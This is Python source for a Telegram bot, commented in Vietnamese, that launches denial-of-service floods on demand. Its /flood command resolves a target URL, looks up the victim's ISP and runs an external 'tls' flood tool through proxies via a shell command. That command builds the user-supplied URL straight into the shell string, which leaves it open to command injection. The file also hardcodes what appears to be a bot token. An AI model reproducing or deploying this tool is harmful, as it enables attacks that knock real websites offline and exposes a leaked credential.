import subprocess
import asyncio
import requests
import json
import socket
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse
import uuid

# ID của nhóm cho phép
ALLOWED_CHAT_ID = -1002673143239  # Thay thế bằng ID nhóm của bạn

# ID của người dùng được phép tấn công không giới hạn
ALLOWED_USER_ID = 5942559129  # Thay thế bằng ID người dùng của bạn

# Token của bạn
token_input = '7567331917:AAHPY5MjMiWV8_1STW2q5Q7sbzGiAokpbio'

# Cờ để kiểm tra xem có ai đang tấn công hay không
is_attacking = False
ongoing_info = {}  # Lưu thông tin ongoing

# Đường dẫn file JSON để lưu thông tin tấn công
ATTACKED_FILE = 'attacked.json'

def escape_html(text):
    escape_characters = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;',
        '{': '&#123;',
        '}': '&#125;',
    }
    for char, escape in escape_characters.items():
        text = text.replace(char, escape)
    return text

def get_ip_from_url(url):
    try:
        split_url = parse.urlsplit(url)
        ip = socket.gethostbyname(split_url.netloc)
        return ip
    except socket.error as e:
        print(f"Không thể lấy IP từ URL: {str(e)}")
        return None

def get_isp_info(ip):
    try:
        print(f"Đang lấy thông tin ISP cho IP: {ip}")
        response = requests.get(f"http://ip-api.com/json/{ip}")
        response.raise_for_status()
        print(f"Thông tin ISP nhận được: {response.json()}")
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Không thể lấy thông tin ISP: {str(e)}")
        return None

def save_attack_info(user_id, command, time, count, attack_id, url):
    try:
        # Đọc file attacked.json nếu tồn tại
        try:
            with open(ATTACKED_FILE, 'r', encoding='utf-8') as f:
                attacked_data = json.load(f)
        except FileNotFoundError:
            attacked_data = {}

        # Cập nhật thông tin tấn công cho user_id
        if user_id not in attacked_data:
            attacked_data[user_id] = {"count": 0, "attacks": []}
        
        attacked_data[user_id]["count"] += 1
        attacked_data[user_id]["attacks"].append({
            "attack_id": attack_id,
            "command": command,
            "time": time,
            "url": url
        })

        # Lưu lại dữ liệu vào file
        with open(ATTACKED_FILE, 'w', encoding='utf-8') as f:
            json.dump(attacked_data, f, indent=2, ensure_ascii=False)

    except Exception as e:
        print(f"Đã xảy ra lỗi khi lưu thông tin tấn công: {str(e)}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking

    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("Bot chỉ hoạt động trong: https://t.me/NhanBbos. Vui lòng tham gia nhóm để sử dụng bot.")
        return

    if is_attacking:
        await update.message.reply_text("Tối đa 1 attack được gửi. Vui lòng đợi trước khi thử lại.")
        return

    try:
        url = context.args[0]
        time = int(context.args[1]) if len(context.args) > 1 else 60

        if time > 60 and update.effective_user.id != ALLOWED_USER_ID:
            await update.message.reply_text("Thời gian tấn công tối đa là 60 giây.")
            return

        ip = get_ip_from_url(url)
        if not ip:
            await update.message.reply_text("Không thể lấy IP từ URL.")
            return

        isp_info = get_isp_info(ip)
        if isp_info:
            isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False)
            isp_info_text = escape_html(isp_info_text)
            user_name = update.effective_user.first_name or "Người dùng"
            
            # Lấy thông tin tấn công đã lưu
            try:
                with open(ATTACKED_FILE, 'r', encoding='utf-8') as f:
                    attacked_data = json.load(f)
            except FileNotFoundError:
                attacked_data = {}

            # Cập nhật số lần tấn công
            if update.effective_user.id not in attacked_data:
                attacked_data[update.effective_user.id] = {"count": 0, "attacks": []}
            
            attacked_data[update.effective_user.id]["count"] += 1
            attack_id = attacked_data[update.effective_user.id]["count"]

            # Lưu lại dữ liệu vào file
            with open(ATTACKED_FILE, 'w', encoding='utf-8') as f:
                json.dump(attacked_data, f, indent=2, ensure_ascii=False)

            # Hiển thị thông tin tấn công với attack_id
            await update.message.reply_text(
                f"Tấn công đã được gửi! \n Attack ID: {attack_id} \n Target: {escape_html(url)}\n<pre>{isp_info_text}</pre>\n🔥Tấn công được gửi bởi: {escape_html(user_name)}🔥",
                parse_mode='HTML'
            )

        # Lưu thông tin tấn công vào file
        save_attack_info(update.effective_user.id, '/flood', time, 1, attack_id, url)

        is_attacking = True
        ongoing_info[update.effective_user.id] = {"url": url, "time_left": time, "attack_id": attack_id}

        command = f"screen -dmS tls chmod 777 * && ./tls {url} {time} 32 4 proxy.txt"

        process = subprocess.Popen(command, shell=True)
        await asyncio.sleep(1)

        for remaining in range(time, 0, -1):
            ongoing_info[update.effective_user.id]["time_left"] = remaining
            await asyncio.sleep(1)

        process.terminate()
        await update.message.reply_text(f"Đã hoàn thành tấn công {escape_html(url)}.")

    except IndexError:
        await update.message.reply_text("Vui lòng nhập đúng lệnh: /flood (url) (time)")
    except ValueError:
        await update.message.reply_text("Thời gian phải là một số nguyên.")
    except subprocess.SubprocessError as e:
        await update.message.reply_text(f"Đã xảy ra lỗi trong quá trình tấn công: {str(e)}")
    except Exception as e:
        await update.message.reply_text(f"Đã xảy ra lỗi: {str(e)}")
    finally:
        is_attacking = False
        ongoing_info.pop(update.effective_user.id, None)

async def ongoing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("Bot chỉ hoạt động trong: https://t.me/beonetworkjs. Vui lòng tham gia nhóm để sử dụng bot.")
        return

    if update.effective_user.id in ongoing_info:
        info = ongoing_info[update.effective_user.id]
        url = info["url"]
        time_left = info["time_left"]
        await update.message.reply_text(f"Tấn công đang diễn ra với URL: {escape_html(url)}. Thời gian còn lại: {time_left} giây.")
    else:
        await update.message.reply_text("Hiện tại không có tấn công nào đang diễn ra.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ALLOWED_CHAT_ID:
        await update.message.reply_text("Bot chỉ hoạt động trong: https://t.me/beonetworkjs. Vui lòng tham gia nhóm để sử dụng bot.")
        return

    help_info = {
        "/ongoing": "Current running.",
        "/bypass": "[url] [time] --Good Bypass.",
        "/flood": "[url] [time] --Good Flood.",
        "/help": "Show All Methods."
    }
    
    help_info_json = json.dumps(help_info, indent=2, ensure_ascii=False)
    help_info_text = escape_html(help_info_json)

    await update.message.reply_text(f"<pre>{help_info_text}</pre>", parse_mode='HTML')

async def shutdown_after_delay(application, delay: int):
    await asyncio.sleep(delay)
    print("Tự động tắt bot sau 30 phút...")
    await application.stop()

def main():
    application = ApplicationBuilder().token(token_input).build()

    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("ongoing", ongoing))
    application.add_handler(CommandHandler("help", help_command))

    print("Bot is running")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(shutdown_after_delay(application, 1800))  # This will stop the bot after 30 minutes

    application.run_polling()

if __name__ == "__main__":
    main()
